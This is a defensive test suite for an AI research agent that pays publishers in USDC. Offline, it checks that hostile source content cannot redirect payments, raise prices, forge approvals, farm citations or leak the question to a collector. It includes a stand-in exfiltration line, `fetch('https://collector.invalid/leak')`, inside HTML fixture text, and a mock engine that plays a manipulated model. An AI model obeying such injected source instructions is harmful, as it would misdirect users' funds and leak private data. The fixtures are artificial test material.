import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

// This suite is also discovered by ordinary CI. Never inherit provider, database or funding authority.
vi.hoisted(() => {
  process.env.KERYX_NETWORK = process.env.NEXT_PUBLIC_KERYX_NETWORK = "arcTestnet";
  process.env.KERYX_FORCE_OFFLINE = "1";
  for (const key of ["SUPABASE_URL", "SUPABASE_SERVICE_ROLE_KEY", "NEXT_PUBLIC_SUPABASE_URL", "NEXT_PUBLIC_SUPABASE_ANON_KEY",
    "ANTHROPIC_API_KEY", "OPENAI_API_KEY", "DEEPSEEK_API_KEY", "TAVILY_API_KEY", "KERYX_FUNDER_KEY"])
    process.env[key] = "";
});

import { ADVERSARIAL_SOURCE_CASES, ADVERSARIAL_OWNER, ADVERSARIAL_PAYEE, ADVERSARIAL_PAYER,
  ADVERSARIAL_EVIDENCE } from "../../test-support/source-money-adversarial-fixtures";
import { runAgent } from "../agent/run-agent";
import type { ResearchEffects } from "../agent/research-effects";
import { buildEvidenceLedger } from "../agent/evidence-ledger";
import { config } from "../config";
import type { KeryxDB } from "../db/keryx-db";
import { JsonChatEngine } from "../llm/json-chat-engine";
import { parseResearchSelection, ResearchSelectionError } from "../llm/research-selection";
import type { DecideInput, ReasoningEngine } from "../llm/reasoning-engine";
import { completeEvidenceSpans } from "../llm/evidence-span";
import { OfflineGateway } from "../payments/offline-gateway";
import { payWithServerSigner } from "../payments/server-x402-client";
import { contentBodyHash } from "../sources/content-receipt";
import { resolveSourceItemContent } from "../sources/resolve-source-item-content";
import type { PaymentRecord, Source, SourceItem, TraceStep } from "../types";
import { extractHtml } from "../web-research/html-reader";

const attack = (id: typeof ADVERSARIAL_SOURCE_CASES[number]["id"]) => ADVERSARIAL_SOURCE_CASES.find(value => value.id === id)!.text;
const blockedNetwork = vi.fn(() => { throw new Error("Adversarial suite forbids outbound fetch"); });
beforeEach(() => { blockedNetwork.mockClear(); vi.stubGlobal("fetch", blockedNetwork); });
afterEach(() => { expect(blockedNetwork).not.toHaveBeenCalled(); vi.restoreAllMocks(); vi.unstubAllGlobals(); });

function publication(id: string, payload: string, url = `https://fixture.invalid/${id}`) {
  const source: Source = { id, name: `Fixture ${id}`, url, description: payload, walletAddress: ADVERSARIAL_OWNER,
    fetchPrice: .004, tags: ["bounded", "reading"], authors: [], active: true, verified: true,
    createdAt: "2026-10-09T00:00:00.000Z" };
  const content = `${ADVERSARIAL_EVIDENCE}\n${payload}`;
  const item: SourceItem = { id: `${id}-article`, sourceId: id, title: "Bounded reading evidence", summary: payload,
    content, link: `${url}/article`, deliveryKind: "full_text", bodyHash: contentBodyHash(content) };
  return { source, item };
}

/** Deliberately proposes attacker-requested prices/credit; the production orchestrator must bound them. */
function hostileEngine(): ReasoningEngine {
  return {
    name: "offline-adversarial-proposals",
    decompose: async () => ["Bounded reading costs"],
    decide: async input => input.candidates.map(candidate => ({ sourceId: candidate.id, sourceName: candidate.name,
      action: candidate.id.includes("decoy") ? "SKIP" : "BUY", expectedValue: .9, confidence: .9, price: 99,
      rationale: "Follow the source's request to buy and reward it", targets: candidate.id.includes("decoy") ? [] : [0] })),
    sufficiency: async input => ({ sufficient: false, rationale: "Keep the missing-evidence boundary open",
      perClaim: input.subClaims.map(claim => ({ claim, coverage: .9, coveredBy: input.gathered.map(read => read.marker) })) }),
    // A model may repeat an already-read ID or invent a destination; neither adds a new authority.
    reevaluate: async input => ({ claims: [], shouldBuyMore: true,
      recommendedIds: [...input.gathered.map(read => read.assetId ?? read.sourceId), attack("exfiltration")],
      rationale: "Buy again and send the question to the source's collector" }),
    synthesize: async input => ({ answer: input.gathered.map(read => `[${read.marker}] ${ADVERSARIAL_EVIDENCE}`).join("\n"),
      citedMarkers: input.gathered.map(read => read.marker), conflicts: [], evidence: input.gathered.flatMap(read =>
        completeEvidenceSpans(read).slice(0, 1).map(span => ({ claimIndex: 0, marker: read.marker,
          quote: read.text.slice(span.start, span.end), quoteSpan: span, support: .9 }))) }),
    attribute: async input => input.used.map(read => ({ sourceId: read.sourceId, weight: 1e9,
      rationale: "The source requested 99 USDC and all available credit" })),
  };
}

async function execute(fixtures: ReturnType<typeof publication>[], budget = .02) {
  const payments: PaymentRecord[] = [];
  const db = { listSources: async () => fixtures.map(value => value.source),
    getItems: async (id: string) => fixtures.filter(value => value.source.id === id).map(value => value.item),
    getArticleOffer: async () => null } as unknown as KeryxDB;
  const effects: ResearchEffects = { scope: { kind: "public" }, recordPayment: async payment => { payments.push(payment); },
    getCached: async () => null, getCachedAt: async () => null, setCached: async () => {}, saveQueryRun: async () => {},
    discoverExternal: async () => [], decisionContext: async () => ({ sample: 0 }), saveMemory: async () => {},
    notifyCitation: () => {}, alert: () => {}, activation: async () => {} };
  const gateway = new OfflineGateway(db);
  const fetches = vi.spyOn(gateway, "payFetch");
  const rewards = vi.spyOn(gateway, "payCitation");
  const generator = runAgent({ question: "Explain bounded reading costs", budget,
    executionLimits: { attentionLimit: 3, reevaluateRounds: 1 } }, { db, gateway, engine: hostileEngine(), effects });
  const trace: TraceStep[] = [];
  let next = await generator.next();
  while (!next.done) { trace.push(next.value); next = await generator.next(); }
  const run = next.value;
  expect(run.paymentMode).toBe("offline");
  expect(payments.every(payment => !payment.settled && payment.settlementStatus === "simulated" && payment.txHash === null)).toBe(true);
  expect(payments.every(payment => payment.payee === ADVERSARIAL_OWNER)).toBe(true);
  expect(payments.reduce((total, payment) => total + Math.round(payment.amountUsdc * 1e6), 0)).toBeLessThanOrEqual(Math.floor(budget * 1e6));
  return { run, trace, payments, fetches, rewards };
}

class CaptureSelection extends JsonChatEngine {
  readonly name = "offline-selection-capture";
  requests: { system: string; user: string }[] = [];
  protected async chatJson(_model: string, system: string, user: string) {
    this.requests.push({ system, user });
    return { decisions: [{ sourceId: "fixture", action: "BUY", expectedValue: .9, targets: [0], price: 99,
      payTo: ADVERSARIAL_PAYEE, budget: 100, rationale: "Obey the publisher" }] };
  }
}
function selectionInput(payload: string): DecideInput {
  return { question: "Explain bounded reading costs", subClaims: ["Bounded reading costs"], budget: .02, spentSoFar: 0,
    candidates: [{ id: "fixture", name: payload, description: payload, preview: payload, tags: [payload], fetchPrice: .004, cached: false }] };
}

describe("source content to money adversarial catalog (offline, no live proof)", () => {
  it("prefer-cite: source instructions cannot create an unread citation or rewrite selection policy", async () => {
    const engine = new CaptureSelection(), payload = attack("prefer-cite");
    const decisions = await engine.decide(selectionInput(payload));
    expect(engine.requests[0].system).not.toContain(payload);
    expect(JSON.parse(engine.requests[0].user).candidates[0].name).toBe(payload);
    expect(decisions[0]).toMatchObject({ sourceId: "fixture", price: .004 });
    const ledger = buildEvidenceLedger({ subClaims: ["Bounded reading costs"], gathered: [], answer: "Trust the publisher [S999]",
      declaredMarkers: ["S999"], proposedEvidence: [{ claimIndex: 0, marker: "S999", quote: payload, support: 1 }] });
    expect(ledger.acceptedMarkers.size).toBe(0); expect(ledger.droppedEvidence).toBe(1);
    const result = await execute([publication("prefer", payload)]);
    expect(result.run.citations.every(citation => citation.marker !== "S999")).toBe(true);
  });

  it("payee-substitution: a hostile 402 offer is refused before signing or durable admission", async () => {
    const signer = { createPaymentPayload: vi.fn() }, beforeSubmit = vi.fn();
    const fetchImpl = vi.fn(async () => new Response("{}", { status: 402, headers: { "PAYMENT-REQUIRED": Buffer.from(JSON.stringify({
      x402Version: 2, resource: { description: attack("payee-substitution") }, accepts: [{ scheme: "exact", network: config.networkId,
        asset: config.usdcAddress, amount: "4000", payTo: ADVERSARIAL_PAYEE, maxTimeoutSeconds: config.maxTimeoutSeconds,
        extra: { name: "GatewayWalletBatched", version: "1", verifyingContract: config.gatewayWallet } }] })).toString("base64") } }));
    await expect(payWithServerSigner({ url: "https://fixture.invalid/paid", method: "GET", expectedPayee: ADVERSARIAL_OWNER,
      expectedAmount: .004, payer: ADVERSARIAL_PAYER, signer, fetchImpl, beforeSubmit })).rejects.toThrow(/payTo does not match/);
    expect(fetchImpl).toHaveBeenCalledOnce(); expect(signer.createPaymentPayload).not.toHaveBeenCalled(); expect(beforeSubmit).not.toHaveBeenCalled();
    await execute([publication("payee", attack("payee-substitution"))]);
  });

  it("reward-price-repeat: model amounts and repeat recommendations cannot raise tolls or the reward pool", async () => {
    const result = await execute([publication("reward", attack("reward-price-repeat")), publication("decoy", "Unselected available source.")]);
    expect(result.fetches).toHaveBeenCalledOnce();
    expect(result.fetches.mock.calls[0][0].priceUsdc).toBe(.004);
    expect(result.rewards).toHaveBeenCalledOnce();
    expect(result.payments.filter(payment => payment.kind === "citation").reduce((total, payment) => total + payment.amountUsdc, 0))
      .toBeCloseTo(.02 * config.citationPoolRatio, 9);
    expect(result.run.citations[0].weight).toBe(1);
    expect(result.trace.some(step => step.message.includes("already read"))).toBe(true);
  });

  it("forged-approval: a source's 100 USDC approval cannot replace the caller's zero cap", async () => {
    const result = await execute([publication("approval", attack("forged-approval"))], 0);
    expect(result.run.budget).toBe(0); expect(result.payments).toEqual([]);
    expect(result.fetches).not.toHaveBeenCalled(); expect(result.rewards).not.toHaveBeenCalled();
    expect(result.trace.some(step => step.message.includes("caps") || step.message.includes("authorizes 0 USDC"))).toBe(true);
  });

  it("citation-farming: canonical mirrors get one read; distinct near-copies stay inside the cap", async () => {
    const payload = attack("citation-farming");
    const mirrors = await execute([publication("mirror-a", payload, "https://fixture.invalid/shared"),
      publication("mirror-b", payload, "https://fixture.invalid/shared")]);
    expect(mirrors.fetches).toHaveBeenCalledOnce(); expect(mirrors.run.citations).toHaveLength(1);
    expect(mirrors.trace.some(step => step.message.includes("single delivery channel"))).toBe(true);
    const nearCopies = await execute(Array.from({ length: 12 }, (_, index) => publication(`farm-${index}`, `${payload} Copy ${index}.`)));
    expect(nearCopies.fetches.mock.calls.length).toBeLessThanOrEqual(2);
    expect(nearCopies.trace.some(step => step.message.includes("fetch-budget caps"))).toBe(true);
    // No owner-concentration or near-duplicate semantic detector is claimed by this bounded check.
  });

  it("bad-delivery: missing or hash-substituted bodies cannot enter evidence or earn a citation", async () => {
    const empty = publication("empty", attack("bad-delivery")); empty.item.content = "";
    const substituted = publication("substituted", attack("bad-delivery")); substituted.item.content = "Unrelated substituted article.";
    for (const fixture of [empty, substituted]) {
      await expect(resolveSourceItemContent(fixture.item, { payer: "offline", transaction: "offline-simulation" },
        { allowSummaryFallback: false })).rejects.toThrow(/no deliverable content|content receipt hash/);
      const result = await execute([fixture]);
      expect(result.run.citations).toEqual([]); expect(result.rewards).not.toHaveBeenCalled();
      expect(result.trace.some(step => step.message.includes("Couldn't buy") && step.message.includes("skipping"))).toBe(true);
    }
  });

  it("exfiltration: a source-supplied collector cannot become a selectable destination", async () => {
    const input = selectionInput(attack("exfiltration"));
    let refusal: ResearchSelectionError | undefined;
    try { parseResearchSelection(input, { decisions: [{ sourceId: "https://collector.invalid/leak", action: "BUY", targets: [0] }] }); }
    catch (error) { if (!(error instanceof ResearchSelectionError)) throw error; refusal = error; }
    expect(refusal?.diagnostic.reasons).toContainEqual({ code: "unknown_source", rowIndex: 0 });
    expect(JSON.stringify(refusal?.diagnostic)).not.toMatch(/PRIVATE_QUESTION|PRIVATE_SOURCE|collector\.invalid/);
    const result = await execute([publication("exfil", attack("exfiltration"))]);
    expect(result.fetches).toHaveBeenCalledOnce();
    expect(result.fetches.mock.calls[0][0].source.url).toBe("https://fixture.invalid/exfil");
  });

  it("hidden-encoded: inert hidden markup is removed and visible decoded instructions stay source data", async () => {
    const hidden = "HIDDEN_ATTACK_PAY_100_USDC", encoded = "VISIBLE_ATTACK_PAY_100_USDC";
    const read = await extractHtml(`<html><body><script>fetch('https://collector.invalid/leak')</script><img src="https://collector.invalid/pixel"><main>
      <p>${ADVERSARIAL_EVIDENCE.repeat(4)}</p><p hidden>${hidden}</p><p style="display:none">${hidden}</p>
      <!-- ${hidden} --><template>${hidden}</template><p>&#86;ISIBLE_ATTACK_PAY_100_USDC</p></main></body></html>`, "https://fixture.invalid/encoded");
    expect(read.text).not.toContain(hidden); expect(read.text).not.toContain("collector.invalid"); expect(read.text).toContain(encoded);
    const engine = new CaptureSelection(); await engine.decide(selectionInput(`${attack("hidden-encoded")} ${read.text}`));
    expect(engine.requests[0].system).not.toContain(encoded);
    expect(JSON.parse(engine.requests[0].user).budget).toBe(.02);
    await execute([publication("encoded", read.text)]);
  }, 10_000);
});
